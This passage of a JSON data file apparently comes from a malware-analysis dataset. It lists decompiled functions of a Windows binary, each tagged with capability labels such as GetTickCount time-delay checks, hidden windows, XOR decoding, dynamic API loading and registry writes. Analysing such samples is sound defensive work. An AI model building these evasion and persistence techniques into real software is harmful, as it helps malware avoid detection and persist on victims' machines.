        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404c8e) overlaps instruction at (ram,0x00404c8d)\n// \n// WARNING: Removing unreachable block (ram,0x00404c7e)\n// WARNING: Removing unreachable block (ram,0x00404cf9)\n\nvoid __cdecl fcn.00404c30(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            *(uVar1 + arg_10h) = *(uVar1 + arg_10h) ^ *(0xd233c68b % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "00401680": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004016f0) overlaps instruction at (ram,0x004016ed)\n// \n// WARNING: Removing unreachable block (ram,0x004016d8)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __thiscall fcn.00401680(uint32_t param_1, int32_t param_2, int32_t param_3, uint8_t *param_4, int32_t param_5)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    char cVar5;\n    int32_t iVar4;\n    uint16_t unaff_BX;\n    int32_t iVar6;\n    uint16_t unaff_DI;\n    uint8_t *puVar7;\n    uint16_t in_ES;\n    \n    iVar6 = 0;\n    if (0 < param_5) {\n        do {\n            iVar4 = param_1 - param_5;\n            uVar3 = iVar4 & 0xff00 | iVar4 ^ iVar4 >> 8 | 0x3d00 | unaff_BX;\n            cVar1 = uVar3;\n            cVar5 = uVar3 >> 8;\n            uVar2 = param_4[iVar6];\n            unaff_BX = unaff_DI;\n            if ((cVar1 <= cVar5) && (cVar5 < cVar1)) {\n                iVar6 = iVar6 + -1;\n                puVar7 = param_4 | &stack0xfffffffc;\n                param_4 = puVar7 + 1;\n                *puVar7 = param_5;\n                unaff_BX = in_ES;\n            }\n            uVar2 = uVar2 ^ *(iVar6 % param_3 + param_2);\n            param_1 = param_1 & 0xffffff00 | uVar2;\n            param_4 = param_4 ^ *(param_4 + 0xe58be73);\n            param_4[iVar6] = param_5 ^ uVar2;\n            iVar6 = iVar6 + 1;\n            unaff_DI = unaff_BX;\n        } while (iVar6 < param_5);\n    }\n    return;\n}\n",
        "token_count": 485
    },
    "00403520": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00403520(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4221d4);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x422570 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4221e4);\n    *0x422574 = (*pcVar1)(iVar2, 0x422200);\n    *0x422578 = (*pcVar1)(iVar2, 0x422210);\n    if (((*0x422570 != 0) && (*0x422574 != 0)) && (*0x422578 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 198
    },
    "00401590": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401590(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407010, 0x42256c, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00404510": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404510(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint auStack68 [4];\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint hKey;\n    \n    puVar5 = &stack0xfffffffc;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar3 != 0) {\n        return 0;\n    }\n    uStack44 = arg_18h;\n    uStack48 = arg_14h;\n    uStack52 = 0;\n    auStack68[3] = arg_10h;\n    auStack68[1] = 0x404579;\n    uVar4 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)();\n    uVar1 = POPCOUNT(uVar4 & 0xff) & 1;\n    if (uVar4 != 0) {\n        uVar1 = 0;\n    }\n    if ((uVar1 != 0) && (uVar1 == 0)) {\n        puVar6 = &stack0xffffffc0;\n        cVar2 = '\\x1e';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar5;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        uVar4 = in(0x78);\n        return uVar4;\n    }\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n    return uVar4 == 0;\n}\n",
        "token_count": 430
    },
    "00404040": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404040(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4222a8, 0x4222ec, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 80
    }
}